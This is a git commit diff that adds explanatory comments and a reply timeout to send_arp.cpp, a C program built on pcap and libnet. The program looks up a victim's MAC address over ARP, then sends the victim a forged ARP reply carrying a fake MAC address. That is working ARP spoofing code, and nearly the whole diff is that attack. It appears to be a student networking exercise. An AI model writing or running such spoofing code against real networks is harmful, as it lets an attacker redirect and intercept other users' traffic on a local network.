af5dc517bd648b017d0553438845846287763bd0
audxo14 <audxo14@gmail.com>
2016-09-26 20:26:06 +0900

    Add some comments.

--- send_arp/send_arp.cpp
+++ send_arp/send_arp.cpp
@@ -23,21 +23,24 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 	
 	bpf_u_int32 mask;
 	bpf_u_int32 net;
-	u_char *packet;
-	const u_char *reply;
-	u_char *d_mac;
+	
+	u_char *packet;			//For the packet we send
+	const u_char *reply;		//For arp reply packet
+	u_char *d_mac;			//taget mac address
 	
 	char tmp_mac[20];
 	int tmp_val[6];
 	char *fake_mac;
-
 	uint8_t f_mac[6];
+
+	int index = 0;
 
 	packet = (u_char *)malloc(packet_size);
 	d_mac = (u_char *)malloc(6 * sizeof(u_char));
+	
 	eth_hdr = (struct libnet_ethernet_hdr *)malloc(sizeof(struct libnet_ethernet_hdr));
 	arp_hdr = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr));
-	memset(packet, 0, 42);
+	memset(packet, 0, 42);		//initiallize the packet memory with 0's
 
 	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
 	{
@@ -55,7 +58,7 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 	
 	for (int i = 0; i < 6; i++)
 	{
-		eth_hdr -> ether_dhost[i] = 0xff;
+		eth_hdr -> ether_dhost[i] = 0xff;	//For broadcasting
 		eth_hdr -> ether_shost[i] = s_mac[i];
 	}
 	
@@ -64,33 +67,31 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 
 	arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);	//ARPHRD_ETHER = 1
 	arp_hdr -> ar_pro = htons(0x0800);		//0x0800 (IPv4)
-	arp_hdr -> ar_hln = 0x06;	
-	arp_hdr -> ar_pln = 0x04;
+	arp_hdr -> ar_hln = 0x06;			//header size
+	arp_hdr -> ar_pln = 0x04;			//protocol size
 	arp_hdr -> ar_op = htons(ARPOP_REQUEST);	//ARPOP_REQUEST = 1
 
-	memcpy(packet + 14, (u_char *)arp_hdr, 8);
-	memcpy(packet + 22, s_mac, 6);
-	memcpy(packet + 28, &s_ip.s_addr, 4);
-	memset(packet + 32, 0x00, 6);
+	memcpy(packet + 14, (u_char *)arp_hdr, 8);	//Copy arp header data into the packet
+	memcpy(packet + 22, s_mac, 6);			//Source MAC address
+	memcpy(packet + 28, &s_ip.s_addr, 4);		//Source IP address
+	memset(packet + 32, 0x00, 6);			//We don't know the MAC address yet
 	inet_pton(AF_INET, victim_ip, &d_ip.s_addr);
-	memcpy(packet + 38, &d_ip.s_addr, 4);
-	
-/*
-	memcpy(arp_hdr + 8, s_mac,6);			//Source MAC address
-	memcpy(arp_hdr + 14, &s_ip.s_addr, 4);	//Source IP address
-	memset(arp_hdr + 18, 0x00, 6);
-	inet_pton(AF_INET, victim_ip, &d_ip.s_addr);
-	memcpy(arp_hdr + 24, &d_ip.s_addr, 4);	
-*/
+	memcpy(packet + 38, &d_ip.s_addr, 4);		//Victim's IP address
 
-	pcap_sendpacket(handle, packet, packet_size);
+	pcap_sendpacket(handle, packet, packet_size);	//Send ARP request packet
 	
-	while(1)
+	while(1)					//Check the packets!
 	{
+		index++;
 		pcap_next_ex(handle, &header, &reply);
-		if(get_arp(reply, s_mac, d_mac, d_ip) == 1)
+		if(get_arp(reply, s_mac, d_mac, d_ip) == 1)	
 			break;
-		printf("hello!\n");
+
+		if(index > 50)				//If we check more than 50 packets
+		{
+			printf("No ARP REPLY packet is captured\n");
+			exit(1);
+		}
 	}
 
 	printf("Victim MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
@@ -119,17 +120,19 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 		}
 	}
 	
+	//Change the ethernet destination host from broadcast to victim's mac address
 	for(int i = 0; i < 6; i++)
 		eth_hdr -> ether_dhost[i] = d_mac[i];	
 	
-	arp_hdr -> ar_op = htons(ARPOP_REPLY);
+	//Change the operation from request to reply
+	arp_hdr -> ar_op = htons(ARPOP_REPLY);		
 		
 	memcpy(packet, (u_char *)eth_hdr, 14); 
 	memcpy(packet+14, (u_char *)arp_hdr, 8);
 	memcpy(packet + 22, f_mac, 6);
 	memcpy(packet + 32, d_mac, 6);
 
-	printf("\n Send Fake PACKET!!\n");
+	printf("\nSend Fake PACKET!!\n");
 	pcap_sendpacket(handle, packet, packet_size);
 	
 	free(packet);
@@ -137,6 +140,7 @@ void send_arp(char *victim_ip, u_char *s_mac, struct in_addr s_ip)
 	free(eth_hdr);
 	free(arp_hdr);
 }
+
 
 int get_arp(const u_char *packet, u_char *s_mac, u_char *d_mac, struct in_addr d_ip)
 {
@@ -146,7 +150,7 @@ int get_arp(const u_char *packet, u_char *s_mac, u_char *d_mac, struct in_addr d
 
 	eth_hdr = (struct libnet_ethernet_hdr *)packet;
 
-	for (int i = 0; i < 6; i++)
+	for (int i = 0; i < 6; i++)	//Check whether the packet is from the victim or not
 	{
 		if(s_mac[i] == eth_hdr ->ether_dhost[i])
 			continue;
@@ -154,9 +158,11 @@ int get_arp(const u_char *packet, u_char *s_mac, u_char *d_mac, struct in_addr d
 			return 0;
 	}
 
-	if (ntohs(eth_hdr->ether_type) == 0x0806)
+	if (ntohs(eth_hdr->ether_type) == 0x0806)	//If it is ARP,
 	{
 		arp_hdr = (struct libnet_arp_hdr *)(packet + 14);
+
+		//If it's a reply packet, get the victim's MAC address
 		if(ntohs(arp_hdr -> ar_op) == ARPOP_REPLY)
 		{
 			memcpy(d_mac, packet + 22,6);
